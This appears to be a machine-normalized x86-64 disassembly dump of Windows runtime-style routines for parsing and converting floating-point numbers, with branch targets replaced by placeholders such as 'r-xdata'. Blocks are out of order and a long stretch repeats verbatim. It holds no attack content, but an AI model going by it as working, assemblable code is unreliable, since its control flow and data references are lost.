lea rax [ rbp - 0x20 ]
mov edi r14d
mov rcx [ rax ]
mov r9d ebx
lea r8 [ rbp - 0x30 ]
mov [ rbp - 0x30 ] rcx
mov ecx [ rax + 0x8 ]
mov eax edx
cdq
mov [ rbp - 0x28 ] ecx
mov r10 r12
and edx r15d
add eax edx
mov r11d eax
and eax r15d
mov r15d 0x20
sub eax edx
sar r11d 0x5
mov ecx eax
mov r13d eax
shl edi cl
sub r15d eax
not edi
mov rdx [ rbp - 0x38 ]
mov eax [ rbp + rdx * 4 - 0x30 ]
mov r13d ebx
lea r8d [ rax + 0x1 ]
cmp r8d eax
jb r-xdata
add rax rsi
mov r8d [ rw-data ]
btr [ rbp - 0x30 ] 0x1f
mov r11d eax
and eax r15d
add r8d edi
mov r13d 0x20
sub eax edx
sar r11d 0x5
mov r10d ebx
mov ecx eax
mov edi eax
lea r9 [ rbp - 0x30 ]
shl r14d cl
sub r13d eax
not r14d
mov r10d eax
and eax r15d
mov edi 0x20
sub eax edx
mov [ rbp - 0x30 ] rbx
bts [ rbp - 0x30 ] 0x1f
mov ecx eax
sar r10d 0x5
mov [ rbp - 0x28 ] ebx
shl r14d cl
mov r11d eax
mov r9d ebx
not r14d
sub edi eax
lea r8 [ rbp - 0x30 ]
mov edx [ r8 ]
mov ecx r13d
mov eax edx
shr edx cl
mov ecx r15d
or edx r9d
and eax edi
mov [ rbp - 0x40 ] eax
mov [ r8 ] edx
add r8 0x4
mov r9d [ rbp - 0x40 ]
shl r9d cl
sub r10 rsi
jne r-xdata
lea edi [ r10 + 0x2 ]
movsxd r10 r11d
mov r9 r10
mov r8d edi
neg r9
mov r13d esi
cmp r8d esi
jae r-xdata
mov edx [ r9 ]
mov ecx edi
mov eax edx
shr edx cl
mov ecx r13d
or edx r10d
and eax r14d
mov [ rbp - 0x40 ] eax
mov [ r9 ] edx
add r9 0x4
mov r10d [ rbp - 0x40 ]
shl r10d cl
sub r12 rsi
jne r-xdata
movsxd r10 r11d
lea edi [ r12 + 0x2 ]
mov r9 r10
neg r9
mov edx [ r8 ]
mov ecx r11d
mov eax edx
shr edx cl
mov ecx edi
or edx r9d
and eax r14d
mov [ rbp - 0x40 ] eax
mov [ r8 ] edx
add r8 0x4
mov r9d [ rbp - 0x40 ]
shl r9d cl
sub r12 rsi
jne r-xdata
movsxd r9 r10d
lea edi [ r12 + 0x2 ]
mov r8 r9
neg r8
mov [ rbp + r8 * 4 - 0x30 ] ebx
mov rdx r8
shl rdx 0x2
lea rax [ rdx + r9 * 4 ]
mov ecx [ rbp + rax - 0x30 ]
mov [ rbp + rdx - 0x30 ] ecx
jmp r-xdata
mov [ rbp + rdx * 4 - 0x30 ] r8d
sub rdx rsi
jns r-xdata
mov [ rbp + rdi * 4 - 0x30 ] ebx
mov rdx rdi
shl rdx 0x2
lea rax [ rdx + r9 * 4 ]
mov ecx [ rbp + rax - 0x30 ]
mov [ rbp + rdx - 0x30 ] ecx
jmp r-xdata
mov [ rbp + rdi * 4 - 0x30 ] ebx
mov rdx rdi
shl rdx 0x2
lea rax [ rdx + r8 * 4 ]
mov ecx [ rbp + rax - 0x30 ]
mov [ rbp + rdx - 0x30 ] ecx
jmp r-xdata
cmp r8 r10
jl r-xdata
mov r9d [ rw-data ]
mov r13d 0x1f
mov eax r9d
mov r11d r13d
cdq
and edx r13d
add eax edx
mov r10d eax
and eax r13d
sar r10d 0x5
sub eax edx
movsxd r15 r10d
sub r11d eax
mov ecx [ rbp + r15 * 4 - 0x30 ]
bt ecx r11d
jae r-xdata
sub r8 rsi
jns r-xdata
cmp rdi r10
jl r-xdata
sub rdi rsi
jns r-xdata
cmp rdi r9
jl r-xdata
mov r8d [ rw-data ]
mov ebx esi
add r8d [ rw-data ]
jmp r-xdata
sub rdi rsi
jns r-xdata
mov ecx r11d
mov eax r14d
shl eax cl
and [ rbp + r15 * 4 - 0x30 ] eax
lea eax [ r10 + 0x1 ]
movsxd rdx eax
cmp rdx r12
jge r-xdata
mov ecx r11d
mov eax r14d
movsxd r8 r10d
shl eax cl
not eax
test [ rbp + r8 * 4 - 0x30 ] eax
jne r-xdata
mov eax [ rw-data ]
mov r15d 0x1f
mov r9d ebx
inc eax
lea r13d [ r15 + 0x1 ]
lea r8 [ rbp - 0x30 ]
cdq
and edx r15d
add eax edx
mov r10d eax
and eax r15d
sub eax edx
sar r10d 0x5
mov ecx eax
mov r11d eax
shl r14d cl
sub r13d eax
not r14d
lea rcx [ rbp + rdx * 4 - 0x30 ]
mov r8 r12
sub r8 rdx
xor edx edx
shl r8 0x2
call sub_14003d760
lea eax [ r9 - 0x1 ]
mov ecx r13d
mov r9d esi
cdq
and edx r13d
add eax edx
mov r8d eax
and eax r13d
sub eax edx
sar r8d 0x5
sub ecx eax
movsxd r13 r8d
mov eax [ rbp + r13 * 4 - 0x30 ]
shl r9d cl
mov ecx ebx
lea edx [ rax + r9 ]
cmp edx eax
jb r-xdata
lea eax [ rsi + r8 ]
cdqe
jmp r-xdata
mov edx [ r8 ]
mov ecx r11d
mov eax edx
shr edx cl
mov ecx r13d
or edx r9d
and eax r14d
mov [ rbp - 0x40 ] eax
mov [ r8 ] edx
add r8 0x4
mov r9d [ rbp - 0x40 ]
shl r9d cl
sub r12 rsi
jne r-xdata
movsxd r10 r10d
mov r8 rdi
mov r9 r10
neg r9
mov ecx esi
cmp edx r9d
jae r-xdata
cmp rax r12
jl r-xdata
mov [ rbp + r8 * 4 - 0x30 ] ebx
mov rdx r8
shl rdx 0x2
lea rax [ rdx + r9 * 4 ]
mov ecx [ rbp + rax - 0x30 ]
mov [ rbp + rdx - 0x30 ] ecx
jmp r-xdata
test ecx ecx
je r-xdata
sub r8d esi
mov [ rbp + r13 * 4 - 0x30 ] edx
movsxd rdx r8d
js r-xdata
cmp [ rbp + rax * 4 - 0x30 ] ebx
jne r-xdata
jmp r-xdata
cmp r8 r10
jl r-xdata
mov r8d ebx
mov ebx edi
jmp r-xdata
sub r8 rsi
jns r-xdata
mov eax [ rbp + rdx * 4 - 0x30 ]
mov ecx ebx
lea r8d [ rax + 0x1 ]
cmp r8d eax
jb r-xdata
add rax rsi
mov ecx esi
cmp r8d esi
jae r-xdata
mov [ rbp + rdx * 4 - 0x30 ] r8d
sub rdx rsi
jns r-xdata
sub_140053b90
mov [ rsp + 0x18 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
mov rbp rsp
sub rsp 0x60
mov rax [ rw-data ]
xor rax rsp
mov [ rbp - 0x10 ] rax
movzx eax [ rcx + 0xa ]
xor ebx ebx
mov r15d 0x1f
mov edi eax
and eax 0x8000
mov [ rbp - 0x38 ] rdx
mov [ rbp - 0x3c ] eax
mov eax [ rcx + 0x6 ]
and edi 0x7fff
mov [ rbp - 0x30 ] eax
mov eax [ rcx + 0x2 ]
sub edi 0x3fff
mov [ rbp - 0x2c ] eax
movzx eax [ rcx ]
lea esi [ rbx + 0x1 ]
shl eax 0x10
lea r12d [ r15 - 0x1c ]
mov [ rbp - 0x28 ] eax
cmp edi 0xffffc001
jne r-xdata
mov r9d [ rw-data ]
lea rcx [ rbp - 0x30 ]
mov r11d r15d
mov rax [ rcx ]
or r14d 0xffffffff
mov [ rbp - 0x40 ] edi
mov [ rbp - 0x20 ] rax
mov eax [ rcx + 0x8 ]
mov r13d ebx
mov [ rbp - 0x18 ] eax
mov eax r9d
cdq
and edx r15d
add eax edx
mov r10d eax
and eax r15d
sub eax edx
sar r10d 0x5
sub r11d eax
movsxd rax r10d
mov ecx [ rbp + rax * 4 - 0x30 ]
bt ecx r11d
jae r-xdata
mov r8d ebx
mov eax ebx
mov ecx r11d
mov eax r14d
shl eax cl
movsxd rcx r10d
and [ rbp + rcx * 4 - 0x30 ] eax
lea eax [ r10 + 0x1 ]
movsxd rdx eax
cmp rdx r12
jge r-xdata
mov ecx r11d
mov eax r14d
movsxd r8 r10d
shl eax cl
not eax
test [ rbp + r8 * 4 - 0x30 ] eax
jne r-xdata
mov [ rbp - 0x30 ] rbx
mov [ rbp - 0x28 ] ebx
mov ebx 0x2
jmp r-xdata
add rax rsi
cmp rax r12
jl r-xdata
test r13d r13d
je r-xdata
lea rcx [ rbp + rdx * 4 - 0x30 ]
mov r8 r12
sub r8 rdx
xor edx edx
shl r8 0x2
call sub_14003d760
lea eax [ r9 - 0x1 ]
mov ecx r15d
cdq
and edx r15d
add eax edx
mov r8d eax
and eax r15d
sub eax edx
sar r8d 0x5
mov edx esi
sub ecx eax
movsxd r9 r8d
mov eax [ rbp + r9 * 4 - 0x30 ]
shl edx cl
lea ecx [ rax + rdx ]
cmp ecx eax
jb r-xdata
lea eax [ rsi + r8 ]
cdqe
jmp r-xdata
sub r15d [ rw-data ]
mov cl r15b
shl r8d cl
neg [ rbp - 0x3c ]
sbb eax eax
and eax 0x80000000
or r8d eax
mov eax [ rw-data ]
or r8d [ rbp - 0x30 ]
cmp eax 0x40
jne r-xdata
cmp [ rbp + rax * 4 - 0x30 ] ebx
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov eax edx
sub eax [ rw-data ]
cmp edi eax
jge r-xdata
add edi esi
mov r13d esi
cmp ecx edx
jae r-xdata
cmp rax r12
jl r-xdata
cmp eax 0x20
jne r-xdata
mov eax [ rbp - 0x2c ]
mov [ rdx + 0x4 ] r8d
mov [ rdx ] eax
jmp r-xdata
cmp edi edx
jg r-xdata
mov [ rbp - 0x30 ] rbx
mov [ rbp - 0x28 ] ebx
mov r8d ebx
mov ebx 0x2
jmp r-xdata
test r13d r13d
je r-xdata
sub r8d esi
mov [ rbp + r9 * 4 - 0x30 ] ecx
movsxd rdx r8d
js r-xdata
cmp [ rbp + rax * 4 - 0x30 ] ebx
jne r-xdata
jmp r-xdata
mov eax ebx
mov rcx [ rbp - 0x10 ]
xor rcx rsp
call sub_14003a6a0
mov rbx [ rsp + 0xb0 ]
add rsp 0x60
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov [ rdx ] r8d
mov eax [ rw-data ]
cdq
and edx r15d
add eax edx
cmp edi [ rw-data ]
jl r-xdata
sub edx [ rbp - 0x40 ]
lea rax [ rbp - 0x20 ]
mov edi r14d
mov rcx [ rax ]
mov r9d ebx
lea r8 [ rbp - 0x30 ]
mov [ rbp - 0x30 ] rcx
mov ecx [ rax + 0x8 ]
mov eax edx
cdq
mov [ rbp - 0x28 ] ecx
mov r10 r12
and edx r15d
add eax edx
mov r11d eax
and eax r15d
mov r15d 0x20
sub eax edx
sar r11d 0x5
mov ecx eax
mov r13d eax
shl edi cl
sub r15d eax
not edi
mov rdx [ rbp - 0x38 ]
mov eax [ rbp + rdx * 4 - 0x30 ]
mov r13d ebx
lea r8d [ rax + 0x1 ]
cmp r8d eax
jb r-xdata
add rax rsi
mov r8d [ rw-data ]
btr [ rbp - 0x30 ] 0x1f
mov r11d eax
and eax r15d
add r8d edi
mov r13d 0x20
sub eax edx
sar r11d 0x5
mov r10d ebx
mov ecx eax
mov edi eax
lea r9 [ rbp - 0x30 ]
shl r14d cl
sub r13d eax
not r14d
mov r10d eax
and eax r15d
mov edi 0x20
sub eax edx
mov [ rbp - 0x30 ] rbx
bts [ rbp - 0x30 ] 0x1f
mov ecx eax
sar r10d 0x5
mov [ rbp - 0x28 ] ebx
shl r14d cl
mov r11d eax
mov r9d ebx
not r14d
sub edi eax
lea r8 [ rbp - 0x30 ]
mov edx [ r8 ]
mov ecx r13d
mov eax edx
shr edx cl
mov ecx r15d
or edx r9d
and eax edi
mov [ rbp - 0x40 ] eax
mov [ r8 ] edx
add r8 0x4
mov r9d [ rbp - 0x40 ]
shl r9d cl
sub r10 rsi
jne r-xdata
lea edi [ r10 + 0x2 ]
movsxd r10 r11d
mov r9 r10
mov r8d edi
neg r9
mov r13d esi
cmp r8d esi
jae r-xdata
mov edx [ r9 ]
mov ecx edi
mov eax edx
shr edx cl
mov ecx r13d
or edx r10d
and eax r14d
mov [ rbp - 0x40 ] eax
mov [ r9 ] edx
add r9 0x4
mov r10d [ rbp - 0x40 ]
shl r10d cl
sub r12 rsi
jne r-xdata
movsxd r10 r11d
lea edi [ r12 + 0x2 ]
mov r9 r10
neg r9
mov edx [ r8 ]
mov ecx r11d
mov eax edx
shr edx cl
mov ecx edi
or edx r9d
and eax r14d
mov [ rbp - 0x40 ] eax
mov [ r8 ] edx
add r8 0x4
mov r9d [ rbp - 0x40 ]
shl r9d cl
sub r12 rsi
jne r-xdata
movsxd r9 r10d
lea edi [ r12 + 0x2 ]
mov r8 r9
neg r8
mov [ rbp + r8 * 4 - 0x30 ] ebx
mov rdx r8
shl rdx 0x2
lea rax [ rdx + r9 * 4 ]
mov ecx [ rbp + rax - 0x30 ]
mov [ rbp + rdx - 0x30 ] ecx
jmp r-xdata
mov [ rbp + rdx * 4 - 0x30 ] r8d
sub rdx rsi
jns r-xdata
mov [ rbp + rdi * 4 - 0x30 ] ebx
mov rdx rdi
shl rdx 0x2
lea rax [ rdx + r9 * 4 ]
mov ecx [ rbp + rax - 0x30 ]
mov [ rbp + rdx - 0x30 ] ecx
jmp r-xdata
mov [ rbp + rdi * 4 - 0x30 ] ebx
mov rdx rdi
shl rdx 0x2
lea rax [ rdx + r8 * 4 ]
mov ecx [ rbp + rax - 0x30 ]
mov [ rbp + rdx - 0x30 ] ecx
jmp r-xdata
cmp r8 r10
jl r-xdata
mov r9d [ rw-data ]
mov r13d 0x1f
mov eax r9d
mov r11d r13d
cdq
and edx r13d
add eax edx
mov r10d eax
and eax r13d
sar r10d 0x5
sub eax edx
movsxd r15 r10d
sub r11d eax
mov ecx [ rbp + r15 * 4 - 0x30 ]
bt ecx r11d
jae r-xdata
sub r8 rsi
jns r-xdata
cmp rdi r10
jl r-xdata
sub rdi rsi
jns r-xdata
cmp rdi r9
jl r-xdata
mov r8d [ rw-data ]
mov ebx esi
add r8d [ rw-data ]
jmp r-xdata
sub rdi rsi
jns r-xdata
mov ecx r11d
mov eax r14d
shl eax cl
and [ rbp + r15 * 4 - 0x30 ] eax
lea eax [ r10 + 0x1 ]
movsxd rdx eax
cmp rdx r12
jge r-xdata
mov ecx r11d
mov eax r14d
movsxd r8 r10d
shl eax cl
not eax
test [ rbp + r8 * 4 - 0x30 ] eax
jne r-xdata
mov eax [ rw-data ]
mov r15d 0x1f
mov r9d ebx
inc eax
lea r13d [ r15 + 0x1 ]
lea r8 [ rbp - 0x30 ]
cdq
and edx r15d
add eax edx
mov r10d eax
and eax r15d
sub eax edx
sar r10d 0x5
mov ecx eax
mov r11d eax
shl r14d cl
sub r13d eax
not r14d
lea rcx [ rbp + rdx * 4 - 0x30 ]
mov r8 r12
sub r8 rdx
xor edx edx
shl r8 0x2
call sub_14003d760
lea eax [ r9 - 0x1 ]
mov ecx r13d
mov r9d esi
cdq
and edx r13d
add eax edx
mov r8d eax
and eax r13d
sub eax edx
sar r8d 0x5
sub ecx eax
movsxd r13 r8d
mov eax [ rbp + r13 * 4 - 0x30 ]
shl r9d cl
mov ecx ebx
lea edx [ rax + r9 ]
cmp edx eax
jb r-xdata
lea eax [ rsi + r8 ]
cdqe
jmp r-xdata
mov edx [ r8 ]
mov ecx r11d
mov eax edx
shr edx cl
mov ecx r13d
or edx r9d
and eax r14d
mov [ rbp - 0x40 ] eax
mov [ r8 ] edx
add r8 0x4
mov r9d [ rbp - 0x40 ]
shl r9d cl
sub r12 rsi
jne r-xdata
movsxd r10 r10d
mov r8 rdi
mov r9 r10
neg r9
mov ecx esi
cmp edx r9d
jae r-xdata
cmp rax r12
jl r-xdata
mov [ rbp + r8 * 4 - 0x30 ] ebx
mov rdx r8
shl rdx 0x2
lea rax [ rdx + r9 * 4 ]
mov ecx [ rbp + rax - 0x30 ]
mov [ rbp + rdx - 0x30 ] ecx
jmp r-xdata
test ecx ecx
je r-xdata
sub r8d esi
mov [ rbp + r13 * 4 - 0x30 ] edx
movsxd rdx r8d
js r-xdata
cmp [ rbp + rax * 4 - 0x30 ] ebx
jne r-xdata
jmp r-xdata
cmp r8 r10
jl r-xdata
mov r8d ebx
mov ebx edi
jmp r-xdata
sub r8 rsi
jns r-xdata
mov eax [ rbp + rdx * 4 - 0x30 ]
mov ecx ebx
lea r8d [ rax + 0x1 ]
cmp r8d eax
jb r-xdata
add rax rsi
mov ecx esi
cmp r8d esi
jae r-xdata
mov [ rbp + rdx * 4 - 0x30 ] r8d
sub rdx rsi
jns r-xdata
sub_14005415c
mov [ rsp + 0x18 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x7 ]
sub rsp 0xa0
mov rax [ rw-data ]
xor rax rsp
mov [ rbp - 0x1 ] rax
mov r13 [ rbp + 0x7f ]
xor ebx ebx
mov [ rbp - 0x71 ] r9d
lea r9d [ rbx + 0x1 ]
mov [ rbp - 0x59 ] rcx
mov [ rbp - 0x69 ] rdx
lea r10 [ rbp - 0x21 ]
mov [ rbp - 0x6d ] bx
mov edi ebx
mov [ rbp - 0x75 ] r9d
mov r14d ebx
mov [ rbp - 0x79 ] ebx
mov r15d ebx
mov esi ebx
mov r12d ebx
mov ecx ebx
test r13 r13
jne r-xdata
mov r11 r8
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
xor eax eax
jmp r-xdata
add r8 r9
jmp r-xdata
cmp al 0x9
je r-xdata
mov rcx [ rbp - 0x1 ]
xor rcx rsp
call sub_14003a6a0
mov rbx [ rsp + 0xf0 ]
add rsp 0xa0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov al [ r8 ]
cmp al 0x20
je r-xdata
cmp al 0xa
je r-xdata
cmp al 0xd
jne r-xdata
mov dl [ r8 ]
add r8 r9
cmp ecx 0x5
jg r-xdata
mov r9d ecx
sub r9d 0x6
je r-xdata
je r-xdata
lea eax [ rdx - 0x31 ]
lea r11 [ r8 - 0x2 ]
cmp al 0x8
jbe r-xdata
dec r9d
je r-xdata
sub dl 0x30
mov [ rbp - 0x79 ] r9d
cmp dl 0x9
ja r-xdata
mov r9d ecx
test ecx ecx
je r-xdata
mov ecx 0x9
jmp r-xdata
cmp dl 0x2b
je r-xdata
lea eax [ rdx - 0x31 ]
cmp al 0x8
ja r-xdata
dec r9d
je r-xdata
mov r8 r11
jmp r-xdata
mov ecx 0x4
jmp r-xdata
lea eax [ rdx - 0x31 ]
cmp al 0x8
jbe r-xdata
dec r9d
je r-xdata
mov r9d 0x1
mov ecx 0x7
cmp dl 0x2d
je r-xdata
cmp dl 0x30
jne r-xdata
mov r9d 0x1
mov r15d r9d
jmp r-xdata
dec r9d
je r-xdata
mov rax [ rbp - 0x69 ]
mov [ rax ] r8
test r14d r14d
je r-xdata
sub r8 r9
jmp r-xdata
mov ecx 0x3
mov rax [ r13 ]
mov rcx [ rax + 0x128 ]
mov rax [ rcx ]
cmp dl [ rax ]
je r-xdata
lea eax [ rdx - 0x31 ]
mov r9d 0x1
mov r14d r9d
cmp al 0x8
ja r-xdata
dec r9d
je r-xdata
mov r9d 0x1
jmp r-xdata
or [ rbp - 0x75 ] 0xffffffff
mov ecx 0x7
jmp r-xdata
jmp r-xdata
mov r8 r11
mov ecx 0x8
jmp r-xdata
cmp dl 0x30
je r-xdata
mov r9d 0x1
mov r11b 0x30
mov r15d r9d
jmp r-xdata
cmp r9d 0x2
jne r-xdata
movzx edx bx
movzx eax bx
mov edi ebx
mov ecx ebx
mov ebx 0x4
cmp edi 0x18
jbe r-xdata
mov ecx 0x5
cmp dl 0x2b
je r-xdata
mov rax [ r13 ]
mov rcx [ rax + 0x128 ]
mov rax [ rcx ]
cmp dl [ rax ]
je r-xdata
lea ecx [ r9 + 0x2 ]
jmp r-xdata
lea eax [ rdx - 0x31 ]
cmp al 0x8
ja r-xdata
dec r9d
je r-xdata
mov r9d 0x1
jmp r-xdata
mov dl [ r8 ]
add r8 r9
sub dl 0x31
cmp dl 0x8
ja r-xdata
cmp dl r11b
jge r-xdata
cmp ecx 0xa
je r-xdata
cmp [ rbp + 0x77 ] ebx
je r-xdata
test edi edi
jne r-xdata
mov al [ rbp - 0xa ]
cmp al 0x5
jl r-xdata
mov ecx 0x2
mov [ rbp - 0x6d ] bx
jmp r-xdata
cmp dl 0x2d
je r-xdata
mov ecx 0x4
jmp r-xdata
cmp dl 0x2b
je r-xdata
mov rax [ r13 ]
mov rcx [ rax + 0x128 ]
mov rax [ rcx ]
cmp dl [ rax ]
jne r-xdata
mov r9d 0x1
mov al 0x30
mov r14d r9d
jmp r-xdata
dec r9d
jne r-xdata
sub r8 r9
jmp r-xdata
mov ecx 0x9
jmp r-xdata
cmp dl 0x39
jg r-xdata
jmp r-xdata
mov r9d 0x1
lea r11 [ r8 - 0x1 ]
cmp dl 0x2b
je r-xdata
sub r10 r9
cmp [ r10 ] bl
je r-xdata
movzx edx bx
movzx eax bx
mov edi ebx
mov ecx ebx
jmp r-xdata
sub r10 r9
mov edi 0x18
add r12d r9d
add al r9b
mov [ rbp - 0xa ] al
mov ecx 0x2
mov [ rbp - 0x6d ] 0x8000
jmp r-xdata
cmp dl 0x30
je r-xdata
sub r8 r9
mov ecx 0xb
jmp r-xdata
cmp dl 0x2d
je r-xdata
cmp dl 0x30
jne r-xdata
cmp dl al
jge r-xdata
mov r9d 0x1
mov r14d r9d
mov [ rbp - 0x79 ] r9d
test edi edi
jne r-xdata
cmp dl r11b
jge r-xdata
lea ecx [ rsi + rsi * 4 ]
movsx eax dl
lea esi [ rax + rcx * 2 - 0x30 ]
cmp esi 0x1450
jg r-xdata
mov ecx 0x7
jmp r-xdata
cmp dl 0x2d
jne r-xdata
dec edi
add r12d r9d
lea r8 [ rbp - 0x41 ]
lea rcx [ rbp - 0x21 ]
mov edx edi
call sub_1400557c8
cmp [ rbp - 0x75 ] ebx
jge r-xdata
mov r8 [ rbp - 0x59 ]
or ax [ rbp - 0x6d ]
mov [ r8 + 0xa ] ax
mov eax ebx
mov [ r8 ] dx
mov [ r8 + 0x2 ] ecx
mov [ r8 + 0x6 ] edi
mov r9d 0x1
cmp dl 0x30
je r-xdata
cmp dl 0x39
jg r-xdata
mov rax [ r13 ]
mov rcx [ rax + 0x128 ]
mov rax [ rcx ]
cmp dl [ rax ]
jne r-xdata
cmp dl 0x30
jge r-xdata
jmp r-xdata
cmp dl 0x39
jg r-xdata
jmp r-xdata
mov esi 0x1451
jmp r-xdata
mov dl [ r8 ]
add r8 r9
add esi r12d
test r15d r15d
jne r-xdata
neg esi
mov ecx r9d
jmp r-xdata
jmp r-xdata
cmp edi 0x19
jae r-xdata
cmp dl 0x2b
je r-xdata
cmp dl 0x39
jg r-xdata
cmp dl 0x30
je r-xdata
mov dl [ r8 ]
add r8 r9
cmp [ rbp - 0x79 ] ebx
jne r-xdata
add esi [ rbp + 0x67 ]
cmp dl 0x43
jle r-xdata
add r12d r9d
sub dl al
add edi r9d
mov [ r10 ] dl
add r10 r9
jmp r-xdata
cmp dl 0x2d
je r-xdata
cmp edi 0x19
jae r-xdata
mov dl [ r8 ]
sub r12d r9d
add r8 r9
jmp r-xdata
cmp esi 0x1450
jg r-xdata
sub esi [ rbp + 0x6f ]
cmp dl 0x45
jle r-xdata
mov dl [ r8 ]
add r8 r9
mov dl [ r8 ]
add r8 r9
sub dl 0x30
add edi r9d
mov [ r10 ] dl
add r10 r9
sub r12d r9d
mov ecx ebx
movzx edx bx
mov eax 0x7fff
mov ebx 0x2
mov edi 0x80000000
jmp r-xdata
cmp esi 0xffffebb0
jl r-xdata
mov ecx 0x6
jmp r-xdata
sub dl 0x64
cmp dl r9b
ja r-xdata
mov edx ebx
movzx eax bx
mov edi ebx
mov ecx ebx
mov ebx 0x1
jmp r-xdata
lea r13 [ rw-data ]
sub r13 0x60
test esi esi
je r-xdata
mov eax [ rbp - 0x39 ]
movzx edx [ rbp - 0x41 ]
mov ecx [ rbp - 0x3f ]
mov edi [ rbp - 0x3b ]
shr eax 0x10
jmp r-xdata
jns r-xdata
cmp [ rbp - 0x71 ] ebx
jne r-xdata
lea r13 [ rw-data ]
neg esi
sub r13 0x60
test esi esi
je r-xdata
mov [ rbp - 0x41 ] bx
mov edi 0x80000000
mov r10d 0x7fff
mov r12d 0x1
test esi esi
jne r-xdata
cdqe
mov r15d 0x8000
lea rcx [ rax + rax * 2 ]
lea rdx [ r13 + rcx * 4 ]
cmp [ rdx ] r15w
jb r-xdata
mov eax esi
add r13 0x54
sar esi 0x3
and eax 0x7
mov [ rbp - 0x71 ] esi
mov [ rbp - 0x61 ] r13
je r-xdata
movzx eax [ rdx + 0xa ]
movzx ecx [ rbp - 0x37 ]
mov [ rbp - 0x51 ] rbx
movzx r9d ax
and ax r10w
mov [ rbp - 0x49 ] ebx
xor r9w cx
and cx r10w
and r9w r15w
lea r8d [ rcx + rax ]
mov [ rbp - 0x75 ] r9w
cmp cx r10w
jae r-xdata
mov rcx [ rdx ]
mov eax [ rdx + 0x8 ]
lea rdx [ rbp - 0x31 ]
mov [ rbp - 0x31 ] rcx
shr rcx 0x10
mov [ rbp - 0x29 ] eax
sub ecx r12d
mov [ rbp - 0x2f ] ecx
neg r9w
cmp ax r10w
jae r-xdata
mov r11d 0xbffd
cmp r8w r11w
ja r-xdata
mov r9d 0x3fbf
cmp r8w r9w
ja r-xdata
test cx cx
jne r-xdata
mov [ rbp - 0x3d ] rbx
mov [ rbp - 0x41 ] ebx
jmp r-xdata
test ax ax
jne r-xdata
add r8w r12w
test [ rbp - 0x39 ] 0x7fffffff
jne r-xdata
mov r10d 0x5
mov r12d ebx
lea rcx [ rbp - 0x51 ]
lea r13d [ r10 - 0x4 ]
add r8w r12w
test [ rdx + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ rbp - 0x3d ] ebx
jne r-xdata
sub r10d r13d
add rcx 0x2
add r12d r13d
test r10d r10d
jg r-xdata
mov edi r12d
lea r14 [ rbp + r9 - 0x41 ]
lea r15 [ rdx + 0x8 ]
and edi r13d
cmp [ rdx + 0x4 ] ebx
jne r-xdata
cmp [ rbp - 0x41 ] ebx
jne r-xdata
lea eax [ r12 + r12 ]
mov [ rbp - 0x79 ] r10d
movsxd r9 eax
test r10d r10d
jle r-xdata
mov r10d [ rbp - 0x49 ]
mov r9d [ rbp - 0x51 ]
mov eax 0xc002
add r8w ax
mov edi 0x80000000
mov r14d 0xffff
test r8w r8w
jle r-xdata
mov r11d r13d
cmp esi r9d
jae r-xdata
cmp [ rdx ] ebx
je r-xdata
mov [ rbp - 0x37 ] bx
jmp r-xdata
add r8w r14w
jns r-xdata
test edi r10d
jne r-xdata
mov r11d [ rbp - 0x79 ]
add r14 0x2
sub r15 0x2
sub r11d r13d
mov [ rbp - 0x79 ] r11d
test r11d r11d
jg r-xdata
add [ rcx + 0x4 ] r13w
mov [ rcx ] esi
test r11d r11d
je r-xdata
movzx eax [ rbp - 0x51 ]
movzx eax r8w
mov edi ebx
neg ax
movzx edx ax
add r8w dx
test r8w r8w
jg r-xdata
mov r11d [ rbp - 0x4d ]
mov edx r9d
add r10d r10d
shr edx 0x1f
add r9d r9d
mov ecx r11d
shr ecx 0x1f
lea eax [ r11 + r11 ]
add r8w r14w
or eax edx
or r10d ecx
mov [ rbp - 0x51 ] r9d
mov [ rbp - 0x4d ] eax
mov [ rbp - 0x49 ] r10d
test r8w r8w
jg r-xdata
movzx eax [ r14 ]
movzx r9d [ r15 ]
mov r11d ebx
imul r9d eax
mov eax [ rcx ]
lea esi [ rax + r9 ]
cmp esi eax
jb r-xdata
mov eax [ rbp - 0x4f ]
or ecx 0xffffffff
mov r12d 0x1
cmp eax ecx
jne r-xdata
and r9d 0x1ffff
cmp r9d 0x18000
jne r-xdata
mov r11d [ rbp - 0x4d ]
mov eax r10d
shr r9d 0x1
mov ecx r11d
shl eax 0x1f
shr r11d 0x1
shl ecx 0x1f
or r11d eax
shr r10d 0x1
or r9d ecx
sub rdx r13
mov [ rbp - 0x4d ] r11d
mov [ rbp - 0x51 ] r9d
jne r-xdata
add edi r13d
add eax r12d
mov [ rbp - 0x4f ] eax
jmp r-xdata
mov eax [ rbp - 0x4b ]
mov [ rbp - 0x4f ] ebx
cmp eax ecx
jne r-xdata
mov r12d 0x1
test [ rbp - 0x51 ] r13b
je r-xdata
test edi edi
mov [ rbp - 0x49 ] r10d
mov edi 0x80000000
je r-xdata
mov esi [ rbp - 0x71 ]
mov eax 0x7fff
cmp r8w ax
jb r-xdata
add eax r12d
mov [ rbp - 0x4b ] eax
movzx eax [ rbp - 0x47 ]
mov [ rbp - 0x4b ] ebx
cmp ax r14w
jne r-xdata
movzx eax [ rbp - 0x4f ]
or r8w [ rbp - 0x75 ]
mov [ rbp - 0x3b ] r10d
mov [ rbp - 0x41 ] ax
mov eax [ rbp - 0x4d ]
mov [ rbp - 0x37 ] r8w
mov [ rbp - 0x3f ] eax
mov r10d 0x7fff
jmp r-xdata
movzx eax [ rbp - 0x75 ]
mov r10d 0x7fff
neg ax
jmp r-xdata
movzx eax r9w
or ax r13w
mov [ rbp - 0x51 ] ax
mov r9d [ rbp - 0x51 ]
jmp r-xdata
add ax r12w
mov [ rbp - 0x47 ] ax
jmp r-xdata
mov [ rbp - 0x47 ] r15w
add r8w r12w
jmp r-xdata
sbb eax eax
mov [ rbp - 0x41 ] rbx
and eax edi
add eax 0x7fff8000
mov [ rbp - 0x39 ] eax
mov r13 [ rbp - 0x61 ]
mov r15d 0x8000
cmp ax r15w
ja r-xdata
mov r10d [ rbp - 0x49 ]
jmp r-xdata
sub_1400549c0
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
push r13
push r15
